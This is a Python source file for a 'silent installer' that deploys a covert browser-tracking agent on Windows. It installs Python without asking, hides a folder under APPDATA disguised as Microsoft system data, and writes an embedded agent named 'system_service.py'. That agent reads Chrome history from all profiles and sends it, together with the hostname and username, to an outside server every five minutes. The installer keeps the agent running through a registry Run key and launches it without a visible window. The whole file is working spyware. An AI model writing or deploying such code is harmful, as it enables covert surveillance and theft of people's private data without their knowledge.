"""
Silent Installer for Browser Tracking Agent
For stealth deployment without user interaction
"""

import os
import sys
import subprocess
import urllib.request
import shutil
import json
import time
import tempfile
from pathlib import Path

class SilentInstaller:
    def __init__(self):
        # Use hidden directory in user profile
        self.install_dir = os.path.join(
            os.environ.get('APPDATA'), 
            'Microsoft', 
            'Windows', 
            'SystemData'
        )
        self.python_url = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe"
        self.server_url = "https://browser-tracking.vercel.app"
        self.log_file = os.path.join(tempfile.gettempdir(), "system_update.log")
        
    def log(self, message, silent=True):
        """Log installation progress"""
        timestamp = time.strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}"
        
        if not silent:
            print(log_entry)
        
        # Write to hidden log file
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry + "\n")
        except:
            pass
    
    def check_python(self):
        """Check if Python is available"""
        try:
            result = subprocess.run([sys.executable, '--version'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                return sys.executable
        except:
            pass
        
        # Try common paths
        python_paths = [
            "python", "python3",
            "C:\\Python311\\python.exe",
            "C:\\Python310\\python.exe"
        ]
        
        for path in python_paths:
            try:
                result = subprocess.run([path, '--version'], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    return path
            except:
                continue
        
        return None
    
    def install_python_silent(self):
        """Install Python silently"""
        self.log("Installing Python silently...")
        
        temp_installer = os.path.join(tempfile.gettempdir(), "python_setup.exe")
        
        try:
            # Download Python installer
            urllib.request.urlretrieve(self.python_url, temp_installer)
            
            # Install silently
            cmd = [
                temp_installer,
                "/quiet",
                "InstallAllUsers=0",  # User install only
                "PrependPath=1",
                "Include_test=0",
                "Include_doc=0",
                "Include_dev=0",
                "Include_debug=0"
            ]
            
            subprocess.run(cmd, capture_output=True)
            time.sleep(15)  # Wait for installation
            
            # Cleanup
            if os.path.exists(temp_installer):
                os.remove(temp_installer)
            
            self.log("Python installation completed")
            return True
            
        except Exception as e:
            self.log(f"Python installation failed: {e}")
            return False
    
    def create_hidden_directories(self):
        """Create hidden installation directories"""
        try:
            os.makedirs(self.install_dir, exist_ok=True)
            
            # Set hidden attribute on Windows
            if os.name == 'nt':
                subprocess.run([
                    'attrib', '+H', self.install_dir
                ], capture_output=True)
            
            self.log("Created hidden directories")
            return True
        except Exception as e:
            self.log(f"Error creating directories: {e}")
            return False
    
    def deploy_agent_files(self):
        """Deploy agent files to hidden directory"""
        self.log("Deploying agent files...")
        
        # Agent code embedded as strings (simplified version)
        agent_code = '''import os
import sys
import time
import sqlite3
import shutil
import tempfile
import requests
import json
from datetime import datetime, timezone

class BrowserAgent:
    def __init__(self):
        self.server_url = "https://browser-tracking.vercel.app"
        self.client_id = None

    def collect_chrome_data(self):
        """Collect Chrome browsing data"""
        chrome_base = os.path.expanduser(r'~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data')
        if not os.path.exists(chrome_base):
            return []

        all_history = []
        profiles = ['Default']

        for item in os.listdir(chrome_base):
            if item.startswith('Profile '):
                profiles.append(item)

        for profile_name in profiles:
            history_db = os.path.join(chrome_base, profile_name, 'History')
            if not os.path.exists(history_db):
                continue

            try:
                with tempfile.NamedTemporaryFile(delete=False, suffix='.db') as temp_file:
                    temp_db = temp_file.name

                shutil.copy2(history_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()

                query = """
                    SELECT url, title, visit_count, last_visit_time
                    FROM urls
                    WHERE last_visit_time > 0
                    ORDER BY last_visit_time DESC
                    LIMIT 50
                """
                cursor.execute(query)

                for row in cursor.fetchall():
                    url, title, visit_count, chrome_time = row

                    if any(skip in url.lower() for skip in ['chrome://', 'localhost', '127.0.0.1']):
                        continue

                    if chrome_time > 0:
                        unix_timestamp = (chrome_time - 11644473600000000) / 1000000
                        visit_time = datetime.fromtimestamp(unix_timestamp, tz=timezone.utc)
                    else:
                        visit_time = datetime.now(tz=timezone.utc)

                    all_history.append({
                        'url': url[:2000],
                        'title': (title or '')[:500],
                        'visit_time': visit_time.isoformat(),
                        'browser_type': 'Chrome',
                        'profile_name': profile_name
                    })

                conn.close()
                os.unlink(temp_db)

            except:
                continue

        # Sort by timestamp and return top 50
        all_history.sort(key=lambda x: x['visit_time'], reverse=True)
        return all_history[:50]
    
    def send_data(self, data):
        """Send data to server"""
        try:
            response = requests.post(
                f"{self.server_url}/api/browsing-data",
                json=data,
                headers={'Content-Type': 'application/json'},
                timeout=30
            )
            return response.status_code == 200
        except:
            return False
    
    def run_once(self):
        """Run data collection once"""
        try:
            # Register client
            system_info = {
                'hostname': os.environ.get('COMPUTERNAME', 'Unknown'),
                'username': os.environ.get('USERNAME', 'Unknown'),
                'os': 'Windows'
            }
            
            reg_response = requests.post(
                f"{self.server_url}/api/register-client",
                json=system_info,
                timeout=30
            )
            
            if reg_response.status_code == 200:
                self.client_id = reg_response.json().get('client_id')
            
            # Collect and send data
            history = self.collect_chrome_data()
            if history and self.client_id:
                data = {
                    'client_id': self.client_id,
                    'browsing_data': history
                }
                return self.send_data(data)
            
        except:
            pass
        
        return False
    
    def run_continuous(self):
        """Run continuously in background"""
        while True:
            try:
                self.run_once()
                time.sleep(300)  # 5 minutes
            except:
                time.sleep(60)  # 1 minute on error

if __name__ == "__main__":
    agent = BrowserAgent()
    if len(sys.argv) > 1 and sys.argv[1] == "--once":
        agent.run_once()
    else:
        agent.run_continuous()
'''
        
        # Write agent file
        agent_path = os.path.join(self.install_dir, "system_service.py")
        try:
            with open(agent_path, 'w', encoding='utf-8') as f:
                f.write(agent_code)
            
            self.log("Agent files deployed")
            return True
        except Exception as e:
            self.log(f"Error deploying files: {e}")
            return False
    
    def setup_persistence(self):
        """Setup persistence mechanism"""
        self.log("Setting up persistence...")
        
        try:
            # Create startup script
            startup_script = f'''
import subprocess
import sys
import os

agent_path = r"{os.path.join(self.install_dir, "system_service.py")}"
python_exe = sys.executable

try:
    subprocess.Popen([python_exe, agent_path], 
                    creationflags=subprocess.CREATE_NO_WINDOW)
except:
    pass
'''
            
            startup_path = os.path.join(self.install_dir, "startup.py")
            with open(startup_path, 'w') as f:
                f.write(startup_script)
            
            # Add to Windows startup (registry)
            import winreg
            key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            python_exe = self.check_python() or "python"
            startup_cmd = f'"{python_exe}" "{startup_path}"'
            
            winreg.SetValueEx(key, "SystemDataService", 0, winreg.REG_SZ, startup_cmd)
            winreg.CloseKey(key)
            
            self.log("Persistence setup completed")
            return True
            
        except Exception as e:
            self.log(f"Error setting up persistence: {e}")
            return False
    
    def install_dependencies_silent(self):
        """Install required dependencies silently"""
        self.log("Installing dependencies...")
        
        python_exe = self.check_python()
        if not python_exe:
            return False
        
        try:
            # Install requests
            subprocess.run([
                python_exe, "-m", "pip", "install", "requests"
            ], capture_output=True)
            
            self.log("Dependencies installed")
            return True
        except Exception as e:
            self.log(f"Error installing dependencies: {e}")
            return False
    
    def start_agent(self):
        """Start the agent"""
        self.log("Starting agent...")
        
        try:
            python_exe = self.check_python()
            agent_path = os.path.join(self.install_dir, "system_service.py")
            
            subprocess.Popen([
                python_exe, agent_path
            ], creationflags=subprocess.CREATE_NO_WINDOW)
            
            self.log("Agent started")
            return True
        except Exception as e:
            self.log(f"Error starting agent: {e}")
            return False
    
    def install_silent(self):
        """Main silent installation"""
        self.log("Starting silent installation...")
        
        # Check/install Python
        python_exe = self.check_python()
        if not python_exe:
            if not self.install_python_silent():
                return False
            python_exe = self.check_python()
            if not python_exe:
                return False
        
        # Create directories
        if not self.create_hidden_directories():
            return False
        
        # Deploy files
        if not self.deploy_agent_files():
            return False
        
        # Install dependencies
        if not self.install_dependencies_silent():
            return False
        
        # Setup persistence
        if not self.setup_persistence():
            return False
        
        # Start agent
        if not self.start_agent():
            return False
        
        self.log("Silent installation completed successfully")
        return True

def main():
    """Main function for silent execution"""
    installer = SilentInstaller()
    
    try:
        # Run completely silent
        success = installer.install_silent()
        
        # Exit silently regardless of result
        sys.exit(0 if success else 1)
        
    except:
        # Exit silently on any error
        sys.exit(1)

if __name__ == "__main__":
    main()
